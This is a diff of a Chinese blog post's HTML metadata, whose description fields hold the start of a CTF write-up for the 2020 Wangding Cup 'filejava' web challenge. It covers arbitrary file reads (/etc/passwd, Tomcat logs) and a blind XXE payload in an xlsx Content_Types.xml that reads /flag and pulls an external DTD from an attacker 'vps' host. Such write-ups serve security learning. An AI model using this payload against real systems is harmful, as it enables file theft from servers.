@@ -7,15 +7,39 @@
 <meta name="robots" content="index, follow">
 <title>网鼎杯2020 web | ch3n9w の 超元域</title>
 <meta name="keywords" content="">
-<meta name="description" content="filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
+<meta name="description" content="filejava
+提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
+
+
 绝对路径
-/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
+/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/
+读文件/etc/passwd
+
+
 读日志文件 logs/catalina.out
-​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
-if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
+​        
+
+发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
+        if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;);
+            e.printStackTrace();
+          }  
+这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
 新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
-&lt;?xml version=&#34;1.0&#34;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt; &lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt; %sp; %param3; %exfil; ]&gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
-&lt;!ENTITY % param3 &#34;&lt;!">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE r [
+&lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt;
+&lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt;
+%sp;
+%param3;
+%exfil;
+]&gt;
+在vps上的web目录下面放置一个ext.dtd, 内容如下:">
 <meta name="author" content="ch3n9w">
 <link rel="canonical" href="https://ch3n9w.github.io/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
@@ -63,19 +87,40 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
         }
 
     </style>
-</noscript>
-  
+</noscript><meta property="og:title" content="网鼎杯2020 web" />
+<meta property="og:description" content="filejava
+提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
 
-<meta property="og:title" content="网鼎杯2020 web" />
-<meta property="og:description" content="filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
+
 绝对路径
-/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
+/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/
+读文件/etc/passwd
+
+
 读日志文件 logs/catalina.out
-​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
-if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
+​        
+
+发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
+        if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;);
+            e.printStackTrace();
+          }  
+这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
 新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
-&lt;?xml version=&#34;1.0&#34;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt; &lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt; %sp; %param3; %exfil; ]&gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
-&lt;!ENTITY % param3 &#34;&lt;!" />
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE r [
+&lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt;
+&lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt;
+%sp;
+%param3;
+%exfil;
+]&gt;
+在vps上的web目录下面放置一个ext.dtd, 内容如下:" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://ch3n9w.github.io/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/" />
 <meta property="og:image" content="https://ch3n9w.github.io/image-20211114142107501.png" /><meta property="article:section" content="posts" />
@@ -85,15 +130,39 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://ch3n9w.github.io/image-20211114142107501.png" />
 <meta name="twitter:title" content="网鼎杯2020 web"/>
-<meta name="twitter:description" content="filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
+<meta name="twitter:description" content="filejava
+提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
+
+
 绝对路径
-/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
+/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/
+读文件/etc/passwd
+
+
 读日志文件 logs/catalina.out
-​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
-if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
+​        
+
+发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
+        if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;);
+            e.printStackTrace();
+          }  
+这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
 新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
-&lt;?xml version=&#34;1.0&#34;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt; &lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt; %sp; %param3; %exfil; ]&gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
-&lt;!ENTITY % param3 &#34;&lt;!"/>
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE r [
+&lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt;
+&lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt;
+%sp;
+%param3;
+%exfil;
+]&gt;
+在vps上的web目录下面放置一个ext.dtd, 内容如下:"/>
 
 
 <script type="application/ld+json">
@@ -122,7 +191,7 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
   "@type": "BlogPosting",
   "headline": "网鼎杯2020 web",
   "name": "网鼎杯2020 web",
-  "description": "filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:\n绝对路径\n/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd\n读日志文件 logs/catalina.out\n​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方\nif (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk\n新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE r [ \u0026lt;!ENTITY % data3 SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://vps/ext.dtd\u0026#34;\u0026gt; %sp; %param3; %exfil; ]\u0026gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:\n\u0026lt;!ENTITY % param3 \u0026#34;\u0026lt;!",
+  "description": "filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:\n绝对路径\n/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd\n读日志文件 logs/catalina.out\n​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方\nif (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk\n新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE r [ \u0026lt;!ENTITY % data3 SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://vps/ext.dtd\u0026#34;\u0026gt; %sp; %param3; %exfil; ]\u0026gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:\n",
   "keywords": [
     
   ],
